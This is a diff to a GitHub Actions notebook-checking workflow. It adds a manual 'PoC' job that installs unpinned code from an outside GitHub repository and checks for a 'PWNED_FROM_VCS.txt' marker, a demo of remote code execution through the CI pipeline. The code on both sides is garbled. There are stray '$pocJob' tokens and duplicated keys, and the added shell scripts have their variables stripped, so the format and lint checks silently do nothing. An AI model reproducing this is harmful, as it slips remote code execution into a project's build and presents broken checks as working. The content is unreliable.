@@ -1,136 +1,86 @@
-# Notebook-related checks
-
 name: Notebooks
 
 on:
-  # Relevant PRs
   pull_request:
     paths:
-    - "**.ipynb"
-  # Allow manual runs
+      - "**.ipynb"
   workflow_dispatch:
-    inputs:
-      mode:
-        description: "Run notebook checks or PoC demo"
-        type: choice
-        required: false
-        default: checks
-        options: [checks, poc]
-    inputs:
-      mode:
-        description: "Run notebook checks or PoC demo"
-        type: choice
-        required: false
-        default: checks
-        options: [checks, poc]
+
+permissions:
+  contents: read
 
 jobs:
-$pocJob$pocJob$pocJob  # Format all notebooks.
   nbfmt:
+    if: github.event_name == 'pull_request'
     name: Notebook format
     runs-on: ubuntu-latest
-    # Skip in PoC mode for clean recording
-    if: github.event_name == 'pull_request' || inputs.mode == 'checks'
-    # Skip in PoC mode for clean recording
-    if: github.event_name == 'pull_request' || inputs.mode == 'checks'
-    # Don't run notebooks on the PoC branch so the run stays green
-    if: startsWith(github.ref, 'refs/heads/poc-unpinned-vcs-rce-') == false
     steps:
-    - uses: actions/checkout@v4
-      with:
-        fetch-depth: 0  # Get *full* history
-    - uses: actions/setup-python@v4
-      with:
-        python-version: '3.11'
-      with:
-        python-version: '3.11'
-      with:
-        python-version: '3.10'
-    - name: Install tensorflow-docs
-      run: python3 -m pip install -U git+https://github.com/tensorflow/docs
-    - name: Fetch main branch
-      run: git fetch -u origin main:main
-    - name: Check notebook formatting
-      run: |
-        if [ "${{ github.event_name }}" == "pull_request" ]; then
-          # Only check notebooks modified in this pull request
-          base_commit=$(git merge-base HEAD ${{ github.event.pull_request.base.sha }})
-          readarray -t changed_notebooks < <(git diff --name-only "${base_commit}...HEAD" "*.ipynb")
-        else
-          # Manual run, check everything
-          readarray -t changed_notebooks < <(find -name '*.ipynb')
-        fi
-        if [[ ${#changed_notebooks[@]} == 0 ]]; then
-          echo "No notebooks modified in this pull request."
-          exit 0
-        else
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
+      - uses: actions/setup-python@v6
+        with:
+          python-version: '3.11'
+      - name: Install tensorflow-docs (pin if you want deterministic builds)
+        run: |
+          python3 -m pip install -U "git+https://github.com/tensorflow/docs@<commit-sha>"
+      - name: Fetch main branch
+        run: git fetch -u origin main:main
+      - name: Check notebook formatting
+        run: |
+          if [ "${{ github.event_name }}" = "pull_request" ]; then
+            base_commit=$(git merge-base HEAD ${{ github.event.pull_request.base.sha }})
+            readarray -t changed_notebooks < <(git diff --name-only "${base_commit}...HEAD" "*.ipynb")
+          else
+            readarray -t changed_notebooks < <(find -name '*.ipynb')
+          fi
+          if [[  -eq 0 ]]; then
+            echo "No notebooks modified."
+            exit 0
+          fi
           echo "Check formatting with nbfmt:"
-          python3 -m tensorflow_docs.tools.nbfmt --test "${changed_notebooks[@]}"
-        fi
+          python3 -m tensorflow_docs.tools.nbfmt --test ""
 
   nblint:
+    if: github.event_name == 'pull_request'
     name: Notebook lint
     runs-on: ubuntu-latest
-    # Skip in PoC mode for clean recording
-    if: github.event_name == 'pull_request' || inputs.mode == 'checks'
-    # Skip in PoC mode for clean recording
-    if: github.event_name == 'pull_request' || inputs.mode == 'checks'
-    # Don't run notebooks on the PoC branch so the run stays green
-    if: startsWith(github.ref, 'refs/heads/poc-unpinned-vcs-rce-') == false
     steps:
-    - uses: actions/checkout@v4
-      with:
-        fetch-depth: 0  # Get *full* history
-    - uses: actions/setup-python@v4
-      with:
-        python-version: '3.11'
-      with:
-        python-version: '3.11'
-      with:
-        python-version: '3.10'
-    - name: Install tensorflow-docs
-      run: python3 -m pip install -U git+https://github.com/tensorflow/docs
-    - name: Fetch main branch
-      run: git fetch -u origin main:main
-
-    # Lint for all notebooks
-    - name: Lint notebooks
-      run: |
-        if [ "${{ github.event_name }}" == "pull_request" ]; then
-          # Only check notebooks modified in this pull request
-          base_commit=$(git merge-base HEAD ${{ github.event.pull_request.base.sha }})
-          readarray -t changed_notebooks < <(git diff --name-only "${base_commit}...HEAD" "*.ipynb" | grep -v 'gemini-2/' || true)
-        else
-          # Manual run, check everything
-          readarray -t changed_notebooks < <(find . -name '*.ipynb' | grep -v 'gemini-2/')
-        fi
-
-        # Define files to exclude from linting
-        excluded_files=(
-          "examples/Object_detection.ipynb",
-          "quickstarts/Template.ipynb",
-        )
-
-        # Filter out excluded files from the changed_notebooks array
-        filtered_notebooks=()
-        for notebook in "${changed_notebooks[@]}"; do
-          exclude=false
-          for excluded_file in "${excluded_files[@]}"; do
-            if [[ "$notebook" == "$excluded_file" ]]; then
-              exclude=true
-              break
-            fi
-          done
-          if [[ "$exclude" == false ]]; then
-            filtered_notebooks+=("$notebook")
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
+      - uses: actions/setup-python@v6
+        with:
+          python-version: '3.11'
+      - name: Install tensorflow-docs (pin if you want deterministic builds)
+        run: |
+          python3 -m pip install -U "git+https://github.com/tensorflow/docs@<commit-sha>"
+      - name: Fetch main branch
+        run: git fetch -u origin main:main
+      - name: Lint notebooks
+        run: |
+          if [ "${{ github.event_name }}" = "pull_request" ]; then
+            base_commit=$(git merge-base HEAD ${{ github.event.pull_request.base.sha }})
+            readarray -t changed_notebooks < <(git diff --name-only "${base_commit}...HEAD" "*.ipynb" | grep -v 'gemini-2/' || true)
+          else
+            readarray -t changed_notebooks < <(find . -name '*.ipynb' | grep -v 'gemini-2/')
           fi
-        done
 
-        if [[ ${#filtered_notebooks[@]} == 0 ]]; then
-          echo "No website notebooks modified in this pull request."
-          exit 0
-        else
-          echo "WARNING: If the button_colab check fails for you, make sure you have <table class=\"tfo-notebook-buttons\"...>"
+          excluded_files=("examples/Object_detection.ipynb" "quickstarts/Template.ipynb")
+          filtered_notebooks=()
+          for nb in ""; do
+            skip=false
+            for ex in ""; do
+              [[ "" == "" ]] && skip=true && break
+            done
+            [[ "" == false ]] && filtered_notebooks+=("")
+          done
+
+          if [[  -eq 0 ]]; then
+            echo "No website notebooks modified."
+            exit 0
+          fi
+
           echo "Lint check with nblint:"
           python3 -m tensorflow_docs.tools.nblint \
             --styles=google,gemini_cookbook \
@@ -140,5 +90,26 @@ $pocJob$pocJob$pocJob  # Format all notebooks.
             --exclude_lint=gemini_cookbook::button_website \
             --arg=base_url:https://ai.google.dev/ \
             --exclude_lint=gemini_cookbook::button_github \
-            "${filtered_notebooks[@]}"
-        fi
+            ""
+
+  # Manual-only job for recording your PoC
+  poc-vcs-install:
+    if: github.event_name == 'workflow_dispatch'
+    name: PoC – VCS install (unpinned)
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-python@v6
+        with:
+          python-version: '3.11'
+      - name: Install upstream (UNPINNED on purpose for demo)
+        run: |
+          python3 -m pip install -U "git+https://github.com/reconsumeralization/tfdocs-poc-20250922173605"
+      - name: Show execution marker
+        run: |
+          echo "If your PoC repo writes a marker (e.g., PWNED_FROM_VCS.txt), show it here:"
+          ls -la
+          test -f PWNED_FROM_VCS.txt && echo "✅ Marker present (upstream code executed)"
+          if [ -f PWNED_FROM_VCS.txt ]; then
+            echo "== PoC marker ==" && cat PWNED_FROM_VCS.txt
+          fi
